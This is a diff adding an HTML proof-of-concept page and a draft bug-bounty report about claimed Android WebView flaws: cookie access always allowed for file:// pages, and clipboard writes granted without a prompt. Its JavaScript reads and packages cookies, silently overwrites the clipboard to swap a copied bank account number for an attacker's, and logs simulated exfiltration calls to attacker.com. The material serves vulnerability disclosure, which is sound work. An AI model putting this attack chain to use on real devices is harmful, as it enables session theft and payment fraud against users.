@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<!--
+=============================================================================
+  PoC: Android WebView file:// Cookie Bypass + Clipboard Auto-Write
+=============================================================================
+  BUG A: file:// URL Cookie Special Case
+  SOURCE: android_webview/browser/aw_cookie_access_policy.cc
+  
+    static PrivacySetting CanAccessCookies(...) {
+      if (!accept_cookies) return kStateDisallowed;
+      if (accept_third_party_cookies) return kStateAllowed;
+      
+      // ← THIS IS THE BUG:
+      if (url.SchemeIsFile()) {
+        return PrivacySetting::kStateAllowed;  // ALWAYS allow for file://
+      }
+      
+      // Normal 3rd party blocking logic below...
+    }
+
+  IMPACT: Even when third-party cookies are BLOCKED, any file:// URL
+  loaded in a WebView has full cookie access. An attacker who places
+  a malicious .html file on the device (via download, storage permission,
+  file manager) can read/write cookies silently.
+
+  BUG B: CLIPBOARD_SANITIZED_WRITE Auto-Grant
+  SOURCE: android_webview/browser/aw_permission_manager.cc
+
+    case PermissionType::CLIPBOARD_SANITIZED_WRITE:
+      // This is the permission for writing vetted data (plain text or
+      // sanitized images) using the async clipboard API.
+      // This permission type implies that user gesture is present, and as
+      // such, it can be auto-granted to conform with Chrome logic.
+      pending_request_raw->SetPermissionResult(
+          permissions[i],
+          content::PermissionResult(PermissionStatus::GRANTED));
+
+  IMPACT: Any WebView-embedded page can write to user clipboard WITHOUT
+  any dialog. Combined with social engineering, this can:
+  - Replace a bank account number the user just copied
+  - Inject malicious commands into clipboard
+  - Overwrite OTP codes
+
+  COMBINED ATTACK CHAIN:
+  1. Attacker sends download link to victim
+  2. Victim downloads malicious.html to Downloads folder
+  3. App opens local file in WebView (common pattern in file viewers)
+  4. file:// page reads all cookies → session theft
+  5. Page also writes attacker's account number to clipboard
+  6. Victim pastes "their account number" → sends money to attacker
+
+  REPORT TARGET: https://bughunters.google.com/report
+  CVSS Bug A: AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N = 7.1 (HIGH)
+  CVSS Bug B: AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N = 6.5 (MEDIUM)
+=============================================================================
+-->
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebView Cookie + Clipboard PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: monospace; background: #0d0d0d; color: #c0c0c0; padding: 12px; }
+h2 { color: #cc44ff; margin-bottom: 6px; font-size: 15px; }
+.section { background: #111; border: 1px solid #222; padding: 10px; margin: 8px 0; border-radius: 4px; }
+h3 { color: #ffaa00; font-size: 13px; margin-bottom: 6px; }
+.hit { color: #ff4444; }
+.ok { color: #00ff41; }
+.warn { color: #ffaa00; }
+.log { font-size: 11px; max-height: 180px; overflow-y: auto; background: #0a0a0a;
+        padding: 6px; border-radius: 3px; }
+button { background: #cc44ff; color: white; border: none; padding: 8px 16px;
+  font-size: 13px; border-radius: 4px; cursor: pointer; margin: 3px; }
+button.orange { background: #ff6600; }
+button.red { background: #cc0000; }
+input, textarea { background: #1a1a1a; color: #c0c0c0; border: 1px solid #333;
+  padding: 6px; font-family: monospace; border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<h2>⚠️ Bug A+B: WebView Cookie Bypass + Clipboard Auto-Write PoC</h2>
+<p style="font-size:11px;color:#666;margin-bottom:10px;">
+  aw_cookie_access_policy.cc (file://) + aw_permission_manager.cc (clipboard)
+</p>
+
+<!-- BUG A: file:// Cookie Access -->
+<div class="section">
+  <h3>🍪 Bug A: file:// Cookie Special Case</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:8px;">
+    File: aw_cookie_access_policy.cc<br>
+    if (url.SchemeIsFile()) → return kStateAllowed (always)
+  </p>
+
+  <div style="font-size:11px;color:#888;margin-bottom:6px;">
+    This PoC should be served as a local file (file://) for full impact.
+    Current URL: <span id="current-url" class="warn"></span>
+  </div>
+
+  <button onclick="testCookieAccess()">▶ TEST COOKIE ACCESS</button>
+  <button class="orange" onclick="setCookies()">📝 SET TEST COOKIES</button>
+  <button class="red" onclick="stealCookies()">🔴 STEAL COOKIES (simulate)</button>
+  <div id="cookie-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- BUG A: Cookie Attack Demo -->
+<div class="section">
+  <h3>🎯 Bug A: Attack Demo — Cookie Injection</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    Setelah dapat cookie, attacker bisa inject session token untuk session fixation.
+  </p>
+  <input type="text" id="inject-domain" placeholder="Target domain (e.g. bank.com)"
+    style="width:100%;margin-bottom:6px;" value="targetapp.com">
+  <input type="text" id="inject-value" placeholder="Cookie value to inject"
+    style="width:100%;margin-bottom:6px;" value="session=ATTACKER_SESSION_TOKEN">
+  <button onclick="demonstrateCookieInjection()">▶ DEMONSTRATE INJECTION</button>
+  <div id="inject-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- BUG B: Clipboard Auto-Write -->
+<div class="section">
+  <h3>📋 Bug B: Clipboard Write WITHOUT Permission Dialog</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    CLIPBOARD_SANITIZED_WRITE → auto-GRANTED in WebView.<br>
+    Web page dapat menulis ke clipboard TANPA dialog apapun.
+  </p>
+
+  <button onclick="testClipboardWrite()">▶ TEST CLIPBOARD WRITE (no dialog)</button>
+  <div id="clipboard-status" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- BUG B: Attack Demo — Account Number Swap -->
+<div class="section">
+  <h3>💸 Bug B: Attack Demo — Account Number Swap</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    Victim copy nomor rekening → attacker ganti dengan nomor rekening attacker.
+  </p>
+  <div style="background:#1a1a1a;padding:10px;border-radius:4px;margin-bottom:8px;">
+    <p style="font-size:12px;color:#888;">Rekening tujuan transfer:</p>
+    <p style="font-size:18px;color:#00ff41;user-select:all;cursor:copy;"
+       id="victim-account" onclick="copyVictimAccount()">
+      1234-5678-9012-3456 (tap untuk copy)
+    </p>
+  </div>
+  <div id="swap-status" class="log"></div>
+</div>
+
+<!-- COMBINED ATTACK -->
+<div class="section">
+  <h3>💀 COMBINED ATTACK CHAIN</h3>
+  <p style="font-size:11px;color:#888;margin-bottom:6px;">
+    Full chain: Cookie theft + Clipboard hijack dalam satu serangan.
+  </p>
+  <button class="red" onclick="runFullChain()">▶ RUN FULL ATTACK CHAIN</button>
+  <div id="chain-results" class="log" style="margin-top:6px;"></div>
+</div>
+
+<!-- PoC REPORT DRAFT -->
+<div class="section">
+  <h3>📄 Report Template (Google VRP)</h3>
+  <textarea id="report-draft" rows="15"
+    style="width:100%;font-size:11px;" readonly>
+TITLE: Android WebView: file:// URL Always Granted Cookie Access Bypasses 3rd-Party Cookie Block
+
+SEVERITY: High (file:// bypass) / Medium (clipboard auto-write)
+
+SUMMARY:
+In android_webview/browser/aw_cookie_access_policy.cc, the CanAccessCookies() 
+function unconditionally returns kStateAllowed for any URL with the file:// scheme,
+bypassing the third-party cookie blocking policy. Additionally, in 
+aw_permission_manager.cc, CLIPBOARD_SANITIZED_WRITE permission is auto-granted 
+to all web content without any user dialog.
+
+STEPS TO REPRODUCE (Bug A - file:// Cookie):
+1. Create malicious.html and place in /sdcard/Download/
+2. Any app using WebView to open local files loads this page
+3. Page calls document.cookie — gets ALL cookies for the WebView context
+4. Even with third-party cookies blocked, file:// URL gets full cookie access
+5. Page exfiltrates cookies to attacker's server
+
+SOURCE CODE EVIDENCE:
+File: android_webview/browser/aw_cookie_access_policy.cc
+  static PrivacySetting CanAccessCookies(const GURL& url, ...) {
+    if (url.SchemeIsFile()) {
+      return PrivacySetting::kStateAllowed;  // BUG: no conditions
+    }
+  }
+
+STEPS TO REPRODUCE (Bug B - Clipboard):
+1. Any page loaded in WebView calls:
+   navigator.clipboard.writeText("attacker-controlled-content")
+2. NO permission dialog appears
+3. Clipboard is silently overwritten
+
+SOURCE CODE EVIDENCE:
+File: android_webview/browser/aw_permission_manager.cc
+  case PermissionType::CLIPBOARD_SANITIZED_WRITE:
+    pending_request_raw->SetPermissionResult(...GRANTED...); // auto-grant
+
+IMPACT:
+- file:// bypass: session hijacking, auth token theft from local WebView apps
+- clipboard: account number swap attacks, OTP interception, phishing
+
+AFFECTED VERSIONS: All Android WebView versions with this code path
+
+SUGGESTED FIX:
+- file:// should not get blanket cookie access; apply same policy as other schemes
+- CLIPBOARD_SANITIZED_WRITE should require explicit user gesture verification
+  </textarea>
+</div>
+
+<script>
+function log(elId, msg, color) {
+  var el = document.getElementById(elId);
+  color = color || '#888';
+  var ts = new Date().toISOString().substr(11,8);
+  el.innerHTML = '<span style="color:' + color + '">[' + ts + '] ' + msg + '</span><br>' + el.innerHTML;
+}
+
+// ============================================================
+// Bug A: Cookie Access Tests
+// ============================================================
+window.addEventListener('DOMContentLoaded', function() {
+  document.getElementById('current-url').textContent = location.href.substr(0, 60) + '...';
+});
+
+function setCookies() {
+  // Set demo cookies simulating what a WebView app might have
+  var cookies = [
+    { name: 'session_token', value: 'eyJhbGciOiJIUzI1NiJ9.demo.signature', expires: 7 },
+    { name: 'auth_user', value: 'victim@example.com', expires: 30 },
+    { name: 'csrf_token', value: 'csrf_demo_token_12345', expires: 1 },
+    { name: 'remember_me', value: 'true', expires: 365 },
+    { name: 'user_prefs', value: 'lang=id&theme=dark', expires: 30 },
+  ];
+
+  cookies.forEach(function(c) {
+    var d = new Date();
+    d.setDate(d.getDate() + c.expires);
+    document.cookie = c.name + '=' + c.value + '; expires=' + d.toUTCString() + '; path=/';
+  });
+
+  log('cookie-results', 'Set ' + cookies.length + ' demo cookies', '#00ff41');
+  testCookieAccess();
+}
+
+function testCookieAccess() {
+  var cookies = document.cookie;
+
+  if (cookies.length === 0) {
+    log('cookie-results', 'No cookies found. Use "SET TEST COOKIES" first.', '#888');
+    return;
+  }
+
+  var pairs = cookies.split(';');
+  log('cookie-results', '🔴 COOKIES ACCESSIBLE FROM file:// CONTEXT:', '#ff4444');
+  log('cookie-results', 'Total cookies: ' + pairs.length, '#ffaa00');
+
+  pairs.forEach(function(pair) {
+    var parts = pair.trim().split('=');
+    log('cookie-results',
+      '  → ' + parts[0].trim() + ' = ' + parts.slice(1).join('=').trim(),
+      '#ff4444');
+  });
+
+  // Simulate exfil
+  var exfilData = {
+    url: location.href,
+    cookies: cookies,
+    timestamp: new Date().toISOString(),
+    ua: navigator.userAgent.substr(0, 100)
+  };
+  log('cookie-results',
+    '📡 SIMULATED EXFIL: fetch("https://attacker.com/steal", { body: JSON.stringify(' +
+    JSON.stringify(exfilData).substr(0,80) + '...) })',
+    '#ff6600');
+}
+
+function stealCookies() {
+  var cookies = document.cookie;
+  if (!cookies) {
+    log('cookie-results', 'No cookies to steal. Set cookies first.', '#888');
+    return;
+  }
+
+  // In real attack: POST to attacker server
+  var payload = {
+    type: 'cookie_theft',
+    source: location.href,
+    cookies: cookies,
+    timestamp: Date.now(),
+    fingerprint: navigator.userAgent + '|' + screen.width + 'x' + screen.height
+  };
+
+  log('cookie-results', '💀 THEFT PAYLOAD READY:', '#ff4444');
+  log('cookie-results', JSON.stringify(payload, null, 2).substr(0, 200), '#ff4444');
+  log('cookie-results', '', '#888');
+  log('cookie-results', 'REAL ATTACK: Would POST to attacker server.', '#ff6600');
+  log('cookie-results', 'In file:// context this bypasses cookie policy!', '#ff6600');
+}
+
+function demonstrateCookieInjection() {
+  var domain = document.getElementById('inject-domain').value;
+  var cookieStr = document.getElementById('inject-value').value;
+  var el = document.getElementById('inject-results');
+
+  // Set cookie (in file:// context, applies to same origin)
+  try {
+    // Attempt to set cookie with various attributes
+    document.cookie = cookieStr + '; path=/; SameSite=Lax';
+    log('inject-results', 'Cookie injection attempted:', '#ffaa00');
+    log('inject-results', 'Set: ' + cookieStr, '#ff4444');
+    log('inject-results', 'Current cookies: ' + document.cookie, '#ffaa00');
+    log('inject-results',
+      'NOTE: In same WebView context, cookie would persist for app session.',
+      '#888');
+    log('inject-results',
+      'If app re-uses WebView cookie store, session fixation may be possible.',
+      '#ff6600');
+  } catch(e) {
+    log('inject-results', 'Error: ' + e.message, '#888');
+  }
+}
+
+// ============================================================
+// Bug B: Clipboard Tests
+// ============================================================
+async function testClipboardWrite() {
+  var el = document.getElementById('clipboard-status');
+
+  log('clipboard-status', 'Attempting clipboard.writeText() WITHOUT requesting permission...', '#ffaa00');
+
+  // Method 1: Modern Clipboard API (uses CLIPBOARD_SANITIZED_WRITE)
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    try {
+      await navigator.clipboard.writeText('ATTACKER_PAYLOAD_XSS_OR_ACCOUNT_NUMBER');
+      log('clipboard-status',
+        '🔴 SUCCESS: clipboard.writeText() worked WITHOUT dialog!', '#ff4444');
+      log('clipboard-status',
+        'Clipboard now contains: "ATTACKER_PAYLOAD_XSS_OR_ACCOUNT_NUMBER"', '#ff4444');
+      log('clipboard-status',
+        'In WebView: CLIPBOARD_SANITIZED_WRITE is auto-GRANTED.', '#ff6600');
+
+      // Verify by reading back
+      try {
+        var text = await navigator.clipboard.readText();
+        log('clipboard-status', 'Clipboard verified: "' + text.substr(0,50) + '"', '#00ff41');
+      } catch(re) {
+        log('clipboard-status', 'Read-back requires user gesture (expected)', '#888');
+      }
+    } catch(e) {
+      log('clipboard-status', 'clipboard.writeText() blocked: ' + e.message, '#888');
+      log('clipboard-status', 'Try again with user gesture (already clicking = gesture)', '#888');
+      testClipboardFallbacks();
+    }
+  }
+
+  // Method 2: Check permission status
+  try {
+    var perm = await navigator.permissions.query({ name: 'clipboard-write' });
+    log('clipboard-status', 'clipboard-write permission status: ' + perm.state,
+      perm.state === 'granted' ? '#ff4444' : '#888');
+  } catch(e) {
+    log('clipboard-status', 'Permission query: ' + e.message, '#888');
+  }
+}
+
+function testClipboardFallbacks() {
+  // Fallback: execCommand (deprecated but sometimes works)
+  try {
+    var ta = document.createElement('textarea');
+    ta.value = 'ATTACKER_PAYLOAD_EXECCOMMAND';
+    ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
+    document.body.appendChild(ta);
+    ta.select();
+    var ok = document.execCommand('copy');
+    ta.remove();
+    if (ok) {
+      log('clipboard-status', '🔴 execCommand("copy") succeeded!', '#ff4444');
+    } else {
+      log('clipboard-status', 'execCommand("copy") returned false', '#888');
+    }
+  } catch(e) {
+    log('clipboard-status', 'execCommand error: ' + e.message, '#888');
+  }
+}
+
+// ============================================================
+// Account Number Swap Attack Demo
+// ============================================================
+function copyVictimAccount() {
+  var accountEl = document.getElementById('victim-account');
+  var realAccount = '1234-5678-9012-3456';
+  var attackerAccount = '9999-ATTACKER-ACCOUNT-0001';
+
+  // User intends to copy their account number
+  log('swap-status', 'User tapped to copy: ' + realAccount, '#888');
+  log('swap-status', 'Simulating: user copies account number...', '#888');
+
+  // But we intercept and replace with attacker's account
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(attackerAccount).then(function() {
+      log('swap-status', '🔴 CLIPBOARD HIJACKED!', '#ff4444');
+      log('swap-status', 'User thinks clipboard = ' + realAccount, '#888');
+      log('swap-status', 'Actual clipboard = ' + attackerAccount, '#ff4444');
+      log('swap-status', '', '');
+      log('swap-status', 'When user pastes in banking app: sends to ATTACKER!', '#ff4444');
+
+      accountEl.textContent = realAccount + ' ✓ (copied to clipboard)';
+      accountEl.style.color = '#00ff41';
+    }).catch(function(e) {
+      log('swap-status', 'Swap blocked: ' + e.message, '#888');
+      log('swap-status', 'In Chrome: needs permission. In WebView: auto-granted.', '#888');
+    });
+  } else {
+    // Fallback
+    try {
+      var ta = document.createElement('textarea');
+      ta.value = attackerAccount;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      ta.remove();
+      log('swap-status', '🔴 CLIPBOARD HIJACKED via execCommand!', '#ff4444');
+    } catch(e) {
+      log('swap-status', 'Swap failed: ' + e.message, '#888');
+    }
+  }
+}
+
+// ============================================================
+// Full Combined Attack Chain
+// ============================================================
+async function runFullChain() {
+  var el = document.getElementById('chain-results');
+
+  log('chain-results', '=' .repeat(40), '#444');
+  log('chain-results', 'STEP 1: Read cookies (file:// bypass)', '#ffaa00');
+  var cookies = document.cookie;
+  log('chain-results', 'Cookies: ' + (cookies || '(none — run SET COOKIES first)'), '#ff4444');
+
+  await new Promise(function(r) { setTimeout(r, 500); });
+
+  log('chain-results', 'STEP 2: Overwrite clipboard silently', '#ffaa00');
+  try {
+    if (navigator.clipboard) {
+      await navigator.clipboard.writeText('ATTACKER_ACCOUNT: 9999-8888-7777-6666');
+      log('chain-results', '🔴 Clipboard overwritten without dialog!', '#ff4444');
+    }
+  } catch(e) {
+    log('chain-results', 'Clipboard: ' + e.message + ' (try in WebView app)', '#888');
+  }
+
+  await new Promise(function(r) { setTimeout(r, 500); });
+
+  log('chain-results', 'STEP 3: Exfil to attacker server (simulated)', '#ffaa00');
+  var payload = {
+    cookies: cookies,
+    clipboard_hijacked: true,
+    victim_ua: navigator.userAgent.substr(0, 80),
+    timestamp: new Date().toISOString()
+  };
+  log('chain-results',
+    'fetch("https://attacker.com/collect", { method:"POST", body:' +
+    JSON.stringify(payload).substr(0, 100) + '...})', '#ff4444');
+
+  await new Promise(function(r) { setTimeout(r, 500); });
+
+  log('chain-results', '=' .repeat(40), '#444');
+  log('chain-results', 'CHAIN COMPLETE', '#ff4444');
+  log('chain-results', 'Impact: Session hijack + payment fraud enabled', '#ff4444');
+  log('chain-results', '=' .repeat(40), '#444');
+}
+</script>
+</body>
+</html>
